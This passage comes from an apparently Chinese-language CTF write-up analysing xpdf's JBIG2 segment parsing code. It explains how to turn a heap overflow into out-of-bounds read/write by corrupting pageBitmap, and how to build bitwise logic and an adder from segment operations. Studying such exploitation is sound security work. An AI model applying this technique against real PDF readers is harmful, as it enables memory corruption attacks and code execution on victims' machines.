class="comment">// read the globals stream</span></span><br><span class="line">    <span class="keyword">if</span> (globalsStream.isStream())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 解析以 DecodeParms 传来的 global stream 流，即 FlateDecode(MyStream1)</span></span><br><span class="line">        curStr = globalsStream.getStream();</span><br><span class="line">        curStr-&gt;reset();</span><br><span class="line">        <span class="comment">// 解析时需要使用到解码器，这里是对解码器进行初始化</span></span><br><span class="line">        arithDecoder-&gt;setStream(curStr);</span><br><span class="line">        huffDecoder-&gt;setStream(curStr);</span><br><span class="line">        mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">        <span class="comment">// 开始读取 segments</span></span><br><span class="line">        readSegments();</span><br><span class="line">        curStr-&gt;close();</span><br><span class="line">        <span class="comment">// swap the newly read segments list into globalSegments</span></span><br><span class="line">        t = segments;</span><br><span class="line">        segments = globalSegments;</span><br><span class="line">        globalSegments = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the main stream</span></span><br><span class="line">    <span class="comment">// 解析 main stream, 即 MySteram2</span></span><br><span class="line">    curStr = str;</span><br><span class="line">    curStr-&gt;reset();</span><br><span class="line">    <span class="comment">// 同样对解码器进行初始化</span></span><br><span class="line">    arithDecoder-&gt;setStream(curStr);</span><br><span class="line">    huffDecoder-&gt;setStream(curStr);</span><br><span class="line">    mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">    readSegments();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pageBitmap)</span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = pageBitmap-&gt;getDataPtr();</span><br><span class="line">        dataEnd = dataPtr + pageBitmap-&gt;getDataSize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = dataEnd = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们可以了解到，<strong>JBIG2Stream 是由多个 Segment 组成的</strong>，Segment 种类较多。这里我们只关注几个有用到的 Segment。</p>
<h4 id="a-EOFSeg">a. EOFSeg</h4>
<p>该 Segment 的解析标志了完成了全部 segment 的读取，没有其他用途。</p>
<h4 id="b-SymbolDictSeg">b. SymbolDictSeg</h4>
<p>SymbolDict 主要存放了<strong>一个指向 Bitmap 的指针数组</strong>。Bitmap 可以用于存放数据，在实际漏洞利用中将起到类似内存的作用。</p>
<p>对于每个 symbol dict 中的 Bitmap，规范中将其称为一个 <strong>instance</strong>。</p>
<p>解析 SymbolDictSeg 时，将会从 stream 中读取并创建出每一个 Bitmap。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GBool <span class="title">JBIG2Stream::readSymbolDictSeg</span><span class="params">(Guint segNum, Guint length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Guint *refSegs, Guint nRefSegs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 创建 bitmaps 数组</span></span><br><span class="line">    <span class="comment">// get the input symbol bitmaps</span></span><br><span class="line">    bitmaps = (JBIG2Bitmap **)gmallocn(numInputSyms + numNewSyms,</span><br><span class="line">                                       <span class="keyword">sizeof</span>(JBIG2Bitmap *));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numInputSyms + numNewSyms; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        bitmaps[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    inputSymbolDict = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seg = findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (seg-&gt;getType() == jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                inputSymbolDict = (JBIG2SymbolDict *)seg;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; inputSymbolDict-&gt;getSize(); ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    bitmaps[k++] = inputSymbolDict-&gt;getBitmap(j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 开始尝试从外部 JBIG2Stream 流中读取 bitmap</span></span><br><span class="line">    symHeight = <span class="number">0</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// read the height class delta height</span></span><br><span class="line">        <span class="keyword">if</span> (huff) [...]</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;dh, iadhStats);</span><br><span class="line">        &#125; </span><br><span class="line">        [...]</span><br><span class="line">        symHeight += dh;</span><br><span class="line">        symWidth = <span class="number">0</span>;</span><br><span class="line">        totalWidth = <span class="number">0</span>;</span><br><span class="line">        j = i;</span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read the symbols in this height class</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// read the delta width</span></span><br><span class="line">            <span class="keyword">if</span> (huff) [...]</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!arithDecoder-&gt;decodeInt(&amp;dw, iadwStats))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line"></span><br><span class="line">            <span class="comment">// using a collective bitmap, so don't read a bitmap here</span></span><br><span class="line">            <span class="keyword">if</span> (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (refAgg) [...]</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 从外部流中读取 bitmap 并将其保存进数组中</span></span><br><span class="line">                bitmaps[numInputSyms + i] =</span><br><span class="line">                    readGenericBitmap(gFalse, symWidth, symHeight,</span><br><span class="line">                                    sdTemplate, gFalse, gFalse, <span class="literal">NULL</span>,</span><br><span class="line">                                    sdATX, sdATY, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// read the collective bitmap</span></span><br><span class="line">        <span class="keyword">if</span> (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建了一个 symbolDict 结构体</span></span><br><span class="line">    <span class="comment">// create the symbol dict object</span></span><br><span class="line">    symbolDict = <span class="keyword">new</span> JBIG2SymbolDict(segNum, numExSyms);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将上面创建的 bitmaps 数组复制进 symbolDict 结构体中</span></span><br><span class="line">    <span class="comment">// exported symbol list</span></span><br><span class="line">    i = j = <span class="number">0</span>;</span><br><span class="line">    ex = gFalse;</span><br><span class="line">    prevRun = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; numInputSyms + numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (huff)</span><br><span class="line">            [...]</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;run, iaexStats);</span><br><span class="line">        &#125;</span><br><span class="line">        [...]</span><br><span class="line">        <span class="keyword">if</span> (ex)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; run; ++cnt)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将上面创建的 bitmaps 对等深拷贝进 symbolDict 中</span></span><br><span class="line">                symbolDict-&gt;setBitmap(j++, bitmaps[i++]-&gt;copy());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i += run;</span><br><span class="line">        &#125;</span><br><span class="line">        ex = !ex;</span><br><span class="line">        prevRun = run;</span><br><span class="line">    &#125;</span><br><span class="line">    [...] <span class="comment">// 释放 bitmaps 数组</span></span><br><span class="line">    <span class="comment">// store the new symbol dict</span></span><br><span class="line">    segments-&gt;append(symbolDict);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="c-PageInfoSeg">c. PageInfoSeg</h4>
<p>对于每个 Page 来说，需要有一个 Bitmap 来表示当前页面渲染的数据。而在解析 PageInfoSeg 时，程序会创建一个流内全局 Bitmap：<strong>pageBitmap</strong>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readPageInfoSeg</span><span class="params">(Guint length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 创建流内全局字段 pageBitmap</span></span><br><span class="line">    pageBitmap = <span class="keyword">new</span> JBIG2Bitmap(<span class="number">0</span>, pageW, curPageH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// default pixel value</span></span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">eofError:</span><br><span class="line">    error(errSyntaxError, getPos(), <span class="string">"Unexpected EOF in JBIG2 stream"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，<strong>pageBitmap 很关键</strong>，它表示了一个 Page 的 bitmap。我们将使用堆溢出来覆写 pageBitmap 的 Width 和 Height，进而达到越界读写的目的。</p>
<blockquote>
<p>同时 PageInfoSeg 还可用于绕过一个 sanity check，下文中会提到。</p>
</blockquote>
<h4 id="d-GenericRegionSeg">d. GenericRegionSeg</h4>
<p>GenericRegionSeg 的解析将会<strong>从流中读取一个 Bitmap</strong>，并<strong>与当前的 pageBitmap 的特定区域进行运算</strong>：</p>
<blockquote>
<p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 GenericRegionSeg 不能存放在 JBIG2Globals 流中。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readGenericRegionSeg</span><span class="params">(Guint segNum, GBool imm,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       GBool lossless, Guint length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// read the bitmap</span></span><br><span class="line">    bitmap = readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               <span class="literal">NULL</span>, atx, aty, mmr ? length - <span class="number">18</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combine the region bitmap into the page bitmap</span></span><br><span class="line">    <span class="keyword">if</span> (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pageH == <span class="number">0xffffffff</span> &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        <span class="keyword">delete</span> bitmap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// store the region bitmap</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，从流中读取 Bitmap 的操作位于 <code>readGenericBitmap</code> 函数中，读取的操作需要使用到<strong>编码器</strong>。</p>
<p>而与 pageBitmap 的运算主要是使用 <code>JBIG2Bitmap::combine</code> 方法，该方法中有五种运算方式，分别是 <strong>与、或、异或和替换</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (combOp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// or</span></span><br><span class="line">        dest |= src1 &amp; m2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// and</span></span><br><span class="line">        dest &amp;= src1 | m1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// xor</span></span><br><span class="line">        dest ^= src1 &amp; m2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// xnor</span></span><br><span class="line">        dest ^= (src1 ^ <span class="number">0xff</span>) &amp; m2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// replace</span></span><br><span class="line">        dest = (src1 &amp; m2) | (dest &amp; m1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们可以将<strong>外部的立即数</strong>，通过利用该段的解析过程，将其传入 pageBitmap 中等待进一步的运算。</p>
</blockquote>
<h4 id="e-GenericRefinementRegionSeg">e. GenericRefinementRegionSeg</h4>
<p>GenericRefinementRegionSeg 的解析过程，组合起来可以对 pageBitmap 上的部分数据进行位运算。我们可以利用这里的位运算来构建加法器：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readGenericRefinementRegionSeg</span><span class="params">(Guint segNum, GBool imm,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 GBool lossless, Guint length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 Guint *refSegs,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 Guint nRefSegs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="keyword">if</span> (nRefSegs == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(seg = findSegment(refSegs[<span class="number">0</span>])) ||</span><br><span class="line">            seg-&gt;getType() != jbig2SegBitmap)</span><br><span class="line">        &#123;</span><br><span class="line">            error(errSyntaxError, getPos(),</span><br><span class="line">                  <span class="string">"Bad bitmap reference in JBIG2 generic refinement segment"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        refBitmap = (JBIG2Bitmap *)seg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        refBitmap = pageBitmap-&gt;getSlice(x, y, w, h);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// read</span></span><br><span class="line">    bitmap = readGenericRefinementRegion(w, h, templ, tpgrOn,</span><br><span class="line">                                         refBitmap, <span class="number">0</span>, <span class="number">0</span>, atx, aty);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combine the region bitmap into the page bitmap</span></span><br><span class="line">    <span class="keyword">if</span> (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        <span class="keyword">delete</span> bitmap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// store the region bitmap</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>当 GenericRefinementRegionSeg <strong>不引用任何段时</strong>，变量 nRefSegs 为 0，此时 <strong>refBitmap 为 pageBitmap 上指定 x、y、w、h 属性的一块数据空间</strong>。</p>
<p>由于函数 <code>readGenericRefinementRegion</code> 只会受到 refBitmap 的影响，因此我们可以认定传出的bitmap 变量等价于 pageBitmap 上特定区域的数据。</p>
<p>接下来，若我们指定 imm 为 false，那么这块等价于 pageBitmap 上特定区域的数据，将被存储进 segments 数组中。</p>
</li>
<li>
<p>若下一次解析 GenericRefinementRegionSeg  时引用了第一步创建的段，那么此时 refBitmap 为第一步创建的 Bitmap。这样当 imm 为 true 时，第一步创建的 Bitmap 将会和 pageBitmap 上指定的位置进行 combine 操作，即位运算。</p>
</li>
<li>
<p>由于第一步创建的 bitmap 是和 pageBitmap 相关，因此整个过程就等价于</p>
<ul>
<li>从 pageBitmap 上<strong>特定位置1</strong>取下一块数据，并保存至 segments 上</li>
<li>从 segments 上取下这块数据，并将其与 pageBitmap 上<strong>特定位置2</strong>进行位运算。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----------------------&gt; x-axis</span><br><span class="line">|</span><br><span class="line">|             .(2)</span><br><span class="line">|</span><br><span class="line">|    .(1)</span><br><span class="line">|</span><br><span class="line">V </span><br><span class="line">y-axis</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>如此，便达到了<strong>让 pageBitmap 上指定两个位置的数据进行位运算的操作</strong>。我们将使用该操作来一步步构建位运算原语、乃至加法器。</p>
<h4 id="f-TextRegionSeg">f. TextRegionSeg</h4>
<p>TextRegionSeg  可以<strong>引用</strong>指定的 <strong>SymbolDictSeg</strong>，并对其中的任意 instance 进行操作。</p>
<blockquote>
<p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 TextRegionSeg 不能存放在 JBIG2Globals 流中。</p>
</blockquote>
<p>整体流程大致如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::readTextRegionSeg</span><span class="params">(Guint segNum, GBool imm,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    GBool lossless, Guint length,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    Guint *refSegs, Guint nRefSegs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// get the symbol bitmaps</span></span><br><span class="line">    <span class="comment">// 从所引用的每个段上，将每个 instance 拷贝到 syms 数组中</span></span><br><span class="line">    syms = (JBIG2Bitmap **)gmallocn(numSyms, <span class="keyword">sizeof</span>(JBIG2Bitmap *));</span><br><span class="line">    kk = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((seg = findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (seg-&gt;getType() == jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                symbolDict = (JBIG2SymbolDict *)seg;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; symbolDict-&gt;getSize(); ++k)</span><br><span class="line">                &#123;</span><br><span class="line">                    syms[kk++] = symbolDict-&gt;getBitmap(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 执行 readTextRegion 函数，将指定的 syms 与新创建出来的 bitmap 进行 combine 操作</span></span><br><span class="line">    bitmap = readTextRegion(huff, refine, w, h, numInstances,</span><br><span class="line">                            logStrips, numSyms, symCodeTab, symCodeLen, syms,</span><br><span class="line">                            defPixel, combOp, transposed, refCorner, sOffset,</span><br><span class="line">                            huffFSTable, huffDSTable, huffDTTable,</span><br><span class="line">                            huffRDWTable, huffRDHTable,</span><br><span class="line">                            huffRDXTable, huffRDYTable, huffRSizeTable,</span><br><span class="line">                            templ, atx, aty);</span><br><span class="line"></span><br><span class="line">    gfree(syms);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// combine the region bitmap into the page bitmap</span></span><br><span class="line">    <span class="comment">// 将当前 bitmap 与 pageBitmap 进行 combine 操作，传递所引用的 instance 上的值至 pageBitmap 上</span></span><br><span class="line">    <span class="keyword">if</span> (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pageH == <span class="number">0xffffffff</span> &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        <span class="keyword">delete</span> bitmap;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// store the region bitmap</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-JBIG2Encode">3. JBIG2Encode</h3>
<h4 id="a-encode-Bitmap">a. encode Bitmap</h4>
<p>通过阅读上面关于 Segments 的源代码，我们可以很容易的得知：在诸如 <code>readGenericBitmap</code> 等读入 bitmap 的函数中，hso 会尝试<strong>从外部 JBIG2Stream 流中，使用某种解码器来对读入的 bitmap 进行解码</strong>（例如代码中多次出现 <code>arithDecoder-&gt;decodeInt</code> 等调用）。</p>
<p>因此，作为提供外部 JBIG2Stream 流的我们，需要对写入至 pdf 中的 bitmap 做对应的编码操作。</p>
<p>从最上面的 <code>JBIG2Stream::reset</code> 函数中可以得知，一共由三种解码器：</p>
<ul>
<li><strong>JArithmeticDecoder</strong></li>
<li>JBIG2HuffmanDecoder</li>
<li>JBIG2MMRDecoder</li>
</ul>
<p>而这些解码器的内部算法，如果要让我们徒手撸一个的话 ，那么做题效率就会非常低。因此，我们可以<strong>使用 <code>jbig2enc</code> 库</strong>来帮助我们完成数据编码操作，该库已经实现了 <strong>JArithmeticDecoder</strong> 状态机的编码算法，故我们无需了解内部细节即可完成对 bitmap 的编码过程。</p>
